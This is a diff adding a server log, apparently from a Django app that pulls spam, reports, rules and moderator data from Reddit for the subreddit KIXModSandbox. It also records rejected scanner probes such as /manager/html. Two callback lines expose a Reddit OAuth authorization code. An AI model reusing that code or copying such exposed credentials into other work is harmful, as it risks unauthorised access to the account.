+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /api/v1/KIXModSandbox/removal_reasons?raw_json=1 HTTP/1.1" 200 141
+2021-01-22:12:42:54 DEBUG  [sessions.py:_make_request:L200] Response: 200 (141 bytes)
+[22/Jan/2021 12:42:54] "GET /removal_reasons/?param=KIXModSandbox HTTP/1.1" 200 13
+[22/Jan/2021 12:42:57] "OPTIONS /spam/crawl/ HTTP/1.1" 200 0
+2021-01-22:12:42:57 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/spam/
+2021-01-22:12:42:57 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:42:57 DEBUG  [sessions.py:_log_request:L118] Params: {'limit': 1024, 'raw_json': 1}
+2021-01-22:12:42:57 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:42:57 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:42:57 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:42:58 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/spam/?limit=1024&raw_json=1 HTTP/1.1" 200 5042
+2021-01-22:12:42:58 DEBUG  [sessions.py:_make_request:L200] Response: 200 (5042 bytes)
+2021-01-22:12:42:58 INFO   [praw_handler.py:run:L163] Number of newly inserted spams: {'tot': 27, 'submission': 19, 'comment': 8}
+[22/Jan/2021 12:42:58] "POST /spam/crawl/ HTTP/1.1" 201 0
+[22/Jan/2021 12:42:58] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+2021-01-22:12:43:01 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/subreddits/mine/contributor/
+2021-01-22:12:43:01 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:43:01 DEBUG  [sessions.py:_log_request:L118] Params: {'limit': 100, 'raw_json': 1}
+2021-01-22:12:43:01 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:01 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:43:01 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:43:02 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /subreddits/mine/contributor/?limit=100&raw_json=1 HTTP/1.1" 200 1175
+2021-01-22:12:43:02 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1175 bytes)
+[22/Jan/2021 12:43:02] "GET /mod_subreddits/ HTTP/1.1" 200 17
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/moderators/
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:43:02 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/api/v1/KIXModSandbox/removal_reasons
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:43:02 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/rules
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:43:02 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:43:02 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /api/v1/KIXModSandbox/removal_reasons?raw_json=1 HTTP/1.1" 200 141
+2021-01-22:12:43:03 DEBUG  [sessions.py:_make_request:L200] Response: 200 (141 bytes)
+[22/Jan/2021 12:43:03] "GET /removal_reasons/?param=KIXModSandbox HTTP/1.1" 200 13
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/rules?raw_json=1 HTTP/1.1" 200 1309
+2021-01-22:12:43:03 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1309 bytes)
+[22/Jan/2021 12:43:03] "GET /community_rules/?param=KIXModSandbox HTTP/1.1" 200 21
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:43:03 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:43:04 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/moderators/?raw_json=1 HTTP/1.1" 200 231
+2021-01-22:12:43:04 DEBUG  [sessions.py:_make_request:L200] Response: 200 (231 bytes)
+[22/Jan/2021 12:43:04] "GET /get_moderators/?param=KIXModSandbox HTTP/1.1" 200 14
+2021-01-22:12:43:05 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/reports/
+2021-01-22:12:43:05 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:43:05 DEBUG  [sessions.py:_log_request:L118] Params: {'limit': 1024, 'raw_json': 1}
+2021-01-22:12:43:05 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:06 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:43:06 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:43:07 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/reports/?limit=1024&raw_json=1 HTTP/1.1" 200 1443
+2021-01-22:12:43:07 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1443 bytes)
+2021-01-22:12:43:07 INFO   [praw_handler.py:run:L163] Number of newly inserted spams: {'tot': 2, 'submission': 0, 'comment': 2}
+[22/Jan/2021 12:43:07] "POST /spam/crawl/ HTTP/1.1" 201 0
+[22/Jan/2021 12:43:07] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 12:43:08] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=2 HTTP/1.1" 200 0
+[22/Jan/2021 12:43:08] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=2 HTTP/1.1" 200 5632
+[22/Jan/2021 12:43:09] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=3 HTTP/1.1" 200 0
+[22/Jan/2021 12:43:09] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=3 HTTP/1.1" 200 4921
+[22/Jan/2021 12:43:12] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=4 HTTP/1.1" 200 0
+Not Found: /spam/
+2021-01-22:12:43:12 WARNING [log.py:log_response:L230] Not Found: /spam/
+[22/Jan/2021 12:43:12] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=4 HTTP/1.1" 404 26
+[22/Jan/2021 12:43:17] "OPTIONS /reddit_logout/ HTTP/1.1" 200 0
+[22/Jan/2021 12:43:17] "GET /reddit_logout/ HTTP/1.1" 200 0
+[22/Jan/2021 12:43:17] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:43:18] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:43:18] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:43:18] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 12:43:21] "GET /reddit_login/ HTTP/1.1" 200 221
+[22/Jan/2021 12:43:23] "GET /reddit_auth?state=1&code=GIhCRCa2ap9WaxEfjiqanXbfmDFuGQ HTTP/1.1" 301 0
+2021-01-22:12:43:23 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:43:24 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 224
+[22/Jan/2021 12:43:24] "GET /reddit_auth/?state=1&code=GIhCRCa2ap9WaxEfjiqanXbfmDFuGQ HTTP/1.1" 302 0
+[22/Jan/2021 12:43:24] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:43:24] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:43:24] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:43:24] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:43:24] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:43:24] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 12:43:24] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:43:24] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 12:43:27] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 13:08:44] code 400, message Bad request syntax ('\x00\x0e8Õ2V)\x15v<¼\x00\x00\x00\x00\x00')
+[22/Jan/2021 13:08:44] " 8Õ2V)v<¼     " 400 -
+Invalid HTTP_HOST header: 'example.com'. You may need to add 'example.com' to ALLOWED_HOSTS.
+2021-01-22:13:44:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'example.com'. You may need to add 'example.com' to ALLOWED_HOSTS.
+Bad Request: /http:/example.com/
+2021-01-22:13:44:41 WARNING [log.py:log_response:L230] Bad Request: /http:/example.com/
+[22/Jan/2021 13:44:41] "GET http://example.com/ HTTP/1.1" 400 66466
+[22/Jan/2021 13:50:40] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 13:50:40] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 13:50:40] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 13:50:41] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:50:41] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:13:50:52 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:13:50:52 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 13:50:52] "GET /manager/html HTTP/1.1" 400 66138
+[22/Jan/2021 13:53:12] "OPTIONS /rest-auth/login/ HTTP/1.1" 200 0
+Bad Request: /rest-auth/login/
+2021-01-22:13:53:12 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/login/
+[22/Jan/2021 13:53:12] "POST /rest-auth/login/ HTTP/1.1" 400 68
+Bad Request: /rest-auth/login/
+2021-01-22:13:53:17 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/login/
+[22/Jan/2021 13:53:17] "POST /rest-auth/login/ HTTP/1.1" 400 68
+[22/Jan/2021 13:53:28] "OPTIONS /rest-auth/registration/ HTTP/1.1" 200 0
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:28 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:28] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:31 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:31] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:34 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:34] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:35 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:35] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:36 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:36] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:46 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:46] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:48 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:48] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:53:50 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:53:50] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:54:00 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:54:00] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:13:54:02 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 13:54:02] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+[22/Jan/2021 13:54:06] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 13:54:06] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 13:54:07] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 13:54:07] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:54:07] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:54:18] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 13:55:12] "OPTIONS /apply_rules/ HTTP/1.1" 200 0
+Forbidden: /apply_rules/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /apply_rules/
+[22/Jan/2021 13:55:12] "POST /apply_rules/ HTTP/1.1" 403 27
+Forbidden: /post/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:12] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 403 27
+Forbidden: /spam/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /spam/
+[22/Jan/2021 13:55:12] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 403 27
+[22/Jan/2021 13:55:12] "OPTIONS /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 13:55:12] "OPTIONS /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 13:55:12] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 13:55:12] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 0
+Forbidden: /spam/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /spam/
+[22/Jan/2021 13:55:12] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 403 27
+Forbidden: /spam/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /spam/
+[22/Jan/2021 13:55:12] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 403 27
+Forbidden: /post/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:12] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 403 27
+Forbidden: /post/
+2021-01-22:13:55:12 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:12] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 403 27
+Forbidden: /apply_rules/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /apply_rules/
+[22/Jan/2021 13:55:15] "POST /apply_rules/ HTTP/1.1" 403 27
+Forbidden: /post/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:15] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 403 27
+Forbidden: /spam/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /spam/
+[22/Jan/2021 13:55:15] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 403 27
+Forbidden: /post/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:15] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 403 27
+Forbidden: /spam/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /spam/
+Forbidden: /post/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /post/
+[22/Jan/2021 13:55:15] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 403 27
+[22/Jan/2021 13:55:15] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 403 27
+Forbidden: /spam/
+2021-01-22:13:55:15 WARNING [log.py:log_response:L230] Forbidden: /spam/
+[22/Jan/2021 13:55:15] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 403 27
+Forbidden: /rest-auth/user/
+2021-01-22:13:55:19 WARNING [log.py:log_response:L230] Forbidden: /rest-auth/user/
+[22/Jan/2021 13:55:19] "GET /rest-auth/user/ HTTP/1.1" 403 27
+[22/Jan/2021 13:55:31] "OPTIONS /post/crawl/ HTTP/1.1" 200 0
+Forbidden: /post/crawl/
+2021-01-22:13:55:31 WARNING [log.py:log_response:L230] Forbidden: /post/crawl/
+[22/Jan/2021 13:55:31] "POST /post/crawl/ HTTP/1.1" 403 59
+Forbidden: /rest-auth/logout/
+2021-01-22:13:55:33 WARNING [log.py:log_response:L230] Forbidden: /rest-auth/logout/
+[22/Jan/2021 13:55:33] "POST /rest-auth/logout/ HTTP/1.1" 403 59
+[22/Jan/2021 13:55:36] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 13:55:36] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 13:55:37] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 13:55:37] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:55:37] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:55:49] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:55:49] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:55:49] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:55:50] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:55:50] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:55:50] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:55:50] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:55:54] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:55:54] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:55:54] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:56:35] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:56:36] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:56:36] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6974
+[22/Jan/2021 13:56:36] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:56:36] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:56:36] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 8414
+[22/Jan/2021 13:56:36] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 9096
+[22/Jan/2021 13:56:50] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:56:50] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:56:50] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 13:56:51] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:56:51] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:56:51] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:56:51] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:57:03] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:57:04] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:57:04] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:57:04] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:57:04] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:57:04] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:57:04] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:57:06] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:57:06] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 1593
+[22/Jan/2021 13:57:06] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:57:06] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5310
+[22/Jan/2021 13:57:06] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5244
+[22/Jan/2021 13:57:06] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:57:06] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:57:36] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:57:37] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:57:37] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:57:37] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:57:37] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 13:57:37] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:57:37] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:59:24] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=2 HTTP/1.1" 200 5632
+[22/Jan/2021 13:59:26] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 13:59:26] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 13:59:26] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 13:59:28] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 13:59:29] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 1593
+[22/Jan/2021 13:59:29] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 13:59:29] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5244
+[22/Jan/2021 13:59:29] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 8396
+[22/Jan/2021 13:59:29] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5310
+[22/Jan/2021 13:59:29] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 14:03:28] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:03:28] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 14:03:28] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 14:03:28] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 14:03:28] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 14:03:28] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 14:03:28] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 14:03:36] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:03:36] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 14:03:36] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[22/Jan/2021 14:03:36] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 11716
+[22/Jan/2021 14:03:36] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 5311
+[22/Jan/2021 14:03:36] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6970
+[22/Jan/2021 14:03:36] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 7753
+[22/Jan/2021 14:03:37] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 14:03:38] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 1593
